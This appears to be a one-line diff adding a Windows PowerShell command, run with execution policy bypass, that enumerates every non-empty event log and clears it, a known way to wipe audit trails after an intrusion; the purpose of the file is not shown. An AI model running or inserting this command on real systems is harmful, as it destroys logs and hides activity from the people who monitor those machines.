@@ -1,0 +1,1 @@
+Systempowershell.exe -ep bypass -Command Get-WinEvent -ListLog * | where { $_.RecordCount } | ForEach-Object -Process{[System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName) }
